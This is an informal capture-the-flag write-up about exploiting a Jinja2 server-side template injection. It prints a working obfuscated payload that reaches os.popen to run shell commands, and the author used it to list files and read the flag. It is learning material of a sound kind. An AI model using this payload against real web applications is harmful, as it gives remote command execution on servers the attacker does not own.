# SSTI 2
-first again i read what sst12 is from the official port swigger document
-after that found out about the tempelate {3*3} and the other to find what type of html formatting is being done
-it cam out to be jinga(spelling might be wrong)
-after that i searched which payload to use for that i found a site that had the jinja payloads
-https://onsecurity.io/article/server-side-template-injection-with-jinja2/
-i tried all the payloads in that page but only this one word after in the space i did ls -a and then cat the flag i wrote in the id place
```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
